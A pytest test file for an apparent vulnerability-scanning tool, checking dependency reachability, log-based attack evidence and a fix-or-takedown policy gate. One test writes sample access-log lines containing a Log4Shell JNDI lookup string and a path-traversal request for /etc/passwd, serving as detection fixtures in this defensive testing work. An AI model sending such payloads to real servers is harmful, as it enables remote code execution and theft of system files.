import shutil

import pytest
import yaml

from hedwig.core import engine, evidence, inventory
from hedwig.core.advisories import REPLAY_DIR, AdvisorySource
from hedwig.core.code_index import CodeIndex
from hedwig.core.policy import decide


def _scan(root, advisories, **source):
    return engine.scan(
        root, AdvisorySource(offline=True, directory=advisories, **source), save=False
    )


def _service(tmp_path, fixtures, name="maven-log4j", allow=None):
    """A copy of one fixture service with a .hedwig.yml."""
    shutil.copytree(fixtures / "projects" / name, tmp_path / name)
    spec = {"tier": "medium"} | ({"allow": allow} if allow is not None else {})
    (tmp_path / ".hedwig.yml").write_text(yaml.safe_dump({"services": {name: spec}}))
    return tmp_path


def test_called_package_outranks_one_that_only_imports(fixtures):
    result = _scan(fixtures / "projects", fixtures / "advisories")
    risk = {f.service: f for f in result.findings if f.service.startswith("py-yaml")}
    assert set(risk) == {"py-yaml", "py-yaml-safe"}  # both are listed
    assert risk["py-yaml"].reachability == "called"
    assert risk["py-yaml-safe"].reachability == "imported"
    assert risk["py-yaml"].risk > risk["py-yaml-safe"].risk


@pytest.mark.parametrize(
    ("service", "package", "symbol"),
    [
        ("node-lodash", "lodash", "_.capitalize"),
        ("broken-after-bump", "lodash", "_.template"),
        ("maven-log4j", "org.apache.logging.log4j:log4j-core", "Logger.info"),
        ("cargo-regex", "regex", "Regex.new"),
        ("composer-phpmailer", "phpmailer/phpmailer", "PHPMailer.setFrom"),
        ("py-yaml", "PyYAML", "yaml.load"),
    ],
)
def test_call_sites_are_found_in_every_language(fixtures, service, package, symbol):
    folder = fixtures / "projects" / service
    packages, _ = inventory.parse_service(folder, service)
    usage = CodeIndex(folder).usage(next(p for p in packages if p.name == package))
    assert symbol in {call.symbol for call in usage.calls}


def test_file_with_a_syntax_error_is_skipped_with_a_warning(tmp_path):
    (tmp_path / "ok.py").write_text("import yaml\nyaml.load('a')\n")
    (tmp_path / "broken.js").write_text("function broken( {\n  const = ;\n")
    index = CodeIndex(tmp_path)
    assert [f.path for f in index.files()] == ["ok.py"]
    assert any("broken.js" in warning for warning in index.warnings)


def test_log_evidence_levels(tmp_path):
    log = tmp_path / "access.log"
    log.write_text("GET /?q=${jndi:ldap://x/a} 200\nGET /?q=../../../etc/passwd 200\n")
    seen = evidence.read_log(log)
    assert evidence.level(seen, "log4j-core") == 3
    assert evidence.level(seen, "express") == 3  # path traversal concerns any package
    log.write_text("GET /?q=${jndi:ldap://x/a} 200\n")
    assert evidence.level(evidence.read_log(log), "express") == 0  # a jndi attempt is not about it
    evidence.write_attack(log, evidence.pick_rule(["log4j-core"]), compromise=True)
    assert evidence.level(evidence.read_log(log), "express") == 4  # compromise is service-wide


@pytest.mark.parametrize(
    ("level", "allow", "action", "on_verified", "on_failed"),
    [
        (0, ["open_fix_pr"], "fix", "review_pr", "failed_pr"),
        (0, ["open_fix_pr", "auto_merge_if_verified"], "fix", "merge", "failed_pr"),
        (0, ["open_fix_pr", "takedown"], "fix", "review_pr", "takedown"),
        (3, ["open_fix_pr", "takedown"], "fix", "review_pr", "takedown"),
        (4, ["open_fix_pr", "takedown"], "takedown", None, None),
        (4, ["open_fix_pr"], "fix", "review_pr", "failed_pr"),
        (0, [], "notify", None, None),
    ],
)
def test_policy_gate_branches(level, allow, action, on_verified, on_failed):
    decision = decide(level, allow)
    assert (decision.action, decision.on_verified, decision.on_failed) == (
        action,
        on_verified,
        on_failed,
    )


def test_every_finding_gets_an_action_even_low_severity(fixtures):
    result = _scan(fixtures / "projects", fixtures / "advisories")
    assert {f.severity for f in result.findings} >= {"low", "critical"}
    assert all(f.decision.action in ("fix", "takedown", "notify") for f in result.findings)


def test_empty_allow_means_observe_only(tmp_path, fixtures):
    root = _service(tmp_path, fixtures, allow=[])
    result = _scan(root, fixtures / "advisories")
    assert {f.decision.action for f in result.findings} == {"notify"}


def test_replay_then_simulated_compromise_takes_the_service_down(tmp_path, fixtures):
    root = _service(tmp_path, fixtures, allow=["open_fix_pr", "takedown"])
    replay = _scan(root, REPLAY_DIR, only={"log4shell"})
    assert [f.id for f in replay.findings] == ["CVE-2021-44228"]
    assert replay.findings[0].decision.action == "fix"

    service = engine.resolve_services(root, "medium")[0]
    evidence.write_attack(service.log_path, evidence.pick_rule(["log4j-core"]), compromise=True)
    after = _scan(root, REPLAY_DIR, only={"log4shell"})
    assert after.findings[0].evidence_level == 4
    assert after.findings[0].decision.action == "takedown"
